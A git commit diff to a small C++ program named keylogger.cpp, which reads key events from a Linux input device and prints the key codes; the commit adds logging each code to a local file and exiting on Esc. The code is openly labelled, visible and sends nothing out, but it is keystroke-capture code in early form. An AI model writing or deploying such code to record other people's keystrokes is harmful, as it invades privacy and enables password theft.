760faaba1f26b8912b0c471bee53e102999eca22
darkstorm <john.kalmykov@gmail.com>
2024-01-27 23:41:56 +0100

    writing to a file

--- keylogger.cpp
+++ keylogger.cpp
@@ -5,15 +5,24 @@
 #include <sys/stat.h>
 
 #define LOGFILE "/tmp/data"
+#define LOG "./log"
+
 
 int main(int argc, char** argv){
     struct input_event ev;
     int fd = open("/dev/input/event23", O_RDONLY); //Replace with your keyinput log file (eg. event3) 
     FILE* fp = fopen(LOGFILE, "a");
+    FILE* lf = fopen(LOG, "a");
+    std::cout << "press Esc to quit\n";
     while(true){
         read(fd, &ev, sizeof(ev));
         if((ev.type == EV_KEY) && (ev.value == 0)){
             std::cout << ev.code << std::endl;
+            fprintf(lf, "%d\n", ev.code);
+            if(ev.code == 1){
+                fclose(lf);
+                break;
+            }
         }
     }
 }
